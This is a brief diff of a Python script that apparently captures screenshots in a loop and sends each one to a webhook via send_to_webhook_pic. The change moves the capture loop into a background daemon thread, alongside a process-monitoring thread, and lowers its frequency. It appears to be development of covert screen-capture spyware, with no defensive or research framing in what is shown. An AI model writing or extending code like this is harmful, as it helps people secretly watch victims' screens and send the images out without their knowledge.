@@ -202,10 +202,10 @@ def screenshot():
 
         send_to_webhook_pic(filename)
 
-        time.sleep(3)  # Reduced for testing
+        time.sleep(30)  # Reduced for testing
 
 
-screenshot()  # Directly call the function
+threading.Thread(target=screenshot, daemon=True).start()
 
 
 # Start process monitoring in a separate thread
